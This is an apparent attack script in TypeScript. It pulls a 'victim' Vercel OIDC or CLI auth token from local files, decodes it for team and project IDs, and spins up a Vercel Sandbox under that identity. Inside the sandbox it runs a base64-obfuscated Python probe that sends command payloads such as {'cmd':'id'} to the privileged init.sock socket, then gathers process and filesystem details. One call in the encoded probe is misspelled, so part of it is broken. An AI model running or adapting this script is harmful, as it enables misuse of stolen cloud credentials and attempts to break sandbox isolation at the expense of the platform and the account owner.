import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadToken(): string {
  try {
    const t = readFileSync("/tmp/vercel-sandbox/victima/.env.local","utf8").match(/^VERCEL_OIDC_TOKEN=(.*)$/m)?.[1] ?? "";
    if (t) return t;
  } catch {}
  try {
    const t = readFileSync("/home/edwar/.local/share/com.vercel.cli/auth.json","utf8").match(/"token":\s*"([^"]+)"/)?.[1] ?? "";
    if (t) return t;
  } catch {}
  return "";
}
const VICTIM = loadToken();
let V: any; try { V = JSON.parse(Buffer.from(VICTIM.split(".")[1],"base64url").toString()); } catch { V = {}; }
const teamId = V.owner_id ?? "team_bi7zLiwN9ULZQklHh3rlmq7D";
const projectId = V.project_id ?? "prj_d78xOhTH7oD0Hs2MTmhpSgpPVc7A";

async function main() {
  const sbx = await Sandbox.create({
    name: "recon2-" + Date.now(),
    token: VICTIM, teamId, projectId,
    source: { type: "git", url: "https://github.com/vercel/sandbox-example-next.git" },
    ports: [3000],
  });
  const B64 = "CmltcG9ydCBzb2NrZXQsIHN0cnVjdCwgdGltZQpTT0NLPScvcnVuL3ZlcmNlbC9zaGFyZS9pbml0LnNvY2snCmRlZiBjb25uZWN0KCk6CiAgICBzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfVU5JWCwgc29ja2V0LlNPQ0tfU1RSRUFNKQogICAgcy5zZXR0aW1lb3V0KDIpCiAgICBzLmNvbm5lY3QoU09DSykKICAgIHJldHVybiBzCnBheWxvYWRzID0gW10KcGF5bG9hZHMuYXBwZW5kKCgncmF3IGhlbGxvJywgYidoZWxsbycpKQpwYXlsb2Fkcy5hcHBlbmQoKCdyYXcgYnJhY2VzJywgYnl0ZXMoWzEyMywxMjVdKSkpCnBsID0gYid7ImNtZCI6ImlkIn0nCnBheWxvYWRzLmFwcGVuZCgoJ3JhdyBqc29uIGNtZCcsIHBsKSkKcGF5bG9hZHMuYXBwZW5kKCgnNC1ieXRlLWxlbicsIHN0cnVjdC5wYWNrKCc+SScsIGxlbihwbCkpICsgcGwpKQpwYXlsb2Fkcy5hcHBlbmQoKCdqc29uLWxpbmUnLCBwbCArIGJ5dGVzKFsxMF0pKSkKZm9yIGxhYmVsLCBkYXRhIGluIHBheWxvYWRzOgogICAgdHJ5OgogICAgICAgIHMgPSBjb25uZWN0KCkKICAgICAgICBzLnNlbmRhbGwoZGF0YSkKICAgICAgICB0aW1lLnNsZWVwKDAuMykKICAgICAgICB0cnk6CiAgICAgICAgICAgIHIgPSBzLnJlY3YoNDA5NikKICAgICAgICAgICAgcHJpbnQobGFiZWwsICctPicsIHJlcHIocls6MjAwXSkpCiAgICAgICAgZXhjZXB0IHNvY2tldC50aW1lb3V0OgogICAgICAgICAgICBwcmludChsYWJlbCwgJy0+ICh0aW1lb3V0LCBubyByZXBseSknKQogICAgICAgIHMuY2xvc2UoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIHByaW50KGxhYmVsLCAnLT4gRVJSJywgZSkKdHJ5OgogICAgcyA9IGNvbm5lZWN0KCkKICAgIHRpbWUuc2xlZXAoMC41KQogICAgdHJ5OgogICAgICAgIHIgPSBzLnJlY3YoNDA5NikKICAgICAgICBwcmludCgncmVhZC1hZnRlci1jb25uZWN0IC0+JywgcmVwcihyWzoyMDBdKSkKICAgIGV4Y2VwdCBzb2NrZXQudGltZW91dDoKICAgICAgICBwcmludCgncmVhZC1hZnRlci1jb25uZWN0IC0+IChub3RoaW5nKScpCiAgICBzLmNsb3NlKCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgcHJpbnQoJ3JlYWQtYWZ0ZXItY29ubmVjdCBFUlInLCBlKQo=";
  const SCRIPT = `
set +e
echo "${B64}" | base64 -d > /tmp/probe.py
echo "===== init.sock probe ====="
timeout 12 python3 /tmp/probe.py
echo "===== key fs facts ====="
ls -la /run/vercel/share/ 2>/dev/null
ps -eo pid,user,cmd 2>/dev/null | grep sandbox-init | grep -v grep
echo "===DONE==="
`;
  const r = await sbx.runCommand("bash", ["-c", SCRIPT], { wait: true, timeout: 40_000 });
  console.log(await r.output("both"));
  console.log("NAME=" + (sbx as any).name);
  console.log("KEEP_ALIVE=" + sbx.domain(3000));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });